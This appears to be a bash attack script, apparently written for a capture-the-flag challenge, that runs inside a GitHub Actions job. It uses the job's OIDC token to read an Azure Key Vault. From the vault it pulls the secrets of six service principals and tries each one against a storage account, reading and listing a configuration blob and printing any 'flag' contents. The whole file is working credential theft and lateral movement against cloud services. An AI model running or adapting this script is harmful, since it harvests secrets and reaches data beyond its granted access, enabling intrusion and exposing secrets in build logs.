#!/usr/bin/env bash
set -x
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

# Try ALL SPs to listKeys on sttblappcfgprodx3euoz
for SP in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  SEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SPA=$(echo "$SEC"|jq -r .appId); SPK=$(echo "$SEC"|jq -r .clientSecret)
  
  # Try storage.azure.com scope directly (data plane)
  ST=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
    --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
  
  if [ ${#ST} -gt 100 ]; then
    # Try reading config blob with data plane token
    CODE=$(curl -s -o /tmp/blob.txt -w "%{http_code}" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
      "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json")
    echo "$SP config/internal-config.json: $CODE"
    if [ "$CODE" = "200" ]; then
      echo "FLAG_CONTENT: $(cat /tmp/blob.txt)"
    fi
    
    # Try list blobs
    CODE2=$(curl -s -o /tmp/list.txt -w "%{http_code}" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
      "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list")
    echo "$SP list config blobs: $CODE2"
    if [ "$CODE2" = "200" ]; then
      echo "BLOBS: $(cat /tmp/list.txt | head -c 1000)"
    fi
  fi
done

# Also try the OIDC SP itself directly for storage data plane
ST2=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
echo "OIDC SP storage token len: ${#ST2}"

# Read config blob
CODE3=$(curl -s -o /tmp/blob2.txt -w "%{http_code}" -H "Authorization: Bearer $ST2" -H "x-ms-version: 2021-08-06" \
  "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json")
echo "OIDC SP config read: $CODE3"
[ "$CODE3" = "200" ] && echo "FLAG: $(cat /tmp/blob2.txt)"

# List blobs
CODE4=$(curl -s -o /tmp/list2.txt -w "%{http_code}" -H "Authorization: Bearer $ST2" -H "x-ms-version: 2021-08-06" \
  "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list")
echo "OIDC SP list: $CODE4"
[ "$CODE4" = "200" ] && echo "BLOB_LIST: $(cat /tmp/list2.txt | head -c 1000)"

echo "=== DONE ==="
